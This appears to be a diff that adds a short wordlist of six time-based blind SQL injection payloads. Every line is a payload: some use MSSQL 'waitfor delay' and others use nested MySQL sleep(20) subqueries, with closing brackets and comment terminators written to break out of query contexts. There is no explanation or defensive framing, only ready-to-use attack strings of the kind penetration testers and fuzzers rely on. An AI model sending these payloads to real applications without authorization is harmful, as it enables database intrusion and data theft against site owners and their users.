@@ -1,0 +1,6 @@
+1,0)waitfor delay'0:0:20'-- -
+1)waitfor delay'0:0:20'-- -
+1 waitfor delay'0:0:20'-- -
+1 and (select*from(select(sleep(20)))a)-- -
+1+(select*from(select(sleep(20)))a)+
+(select*from(select(sleep(20)))a)
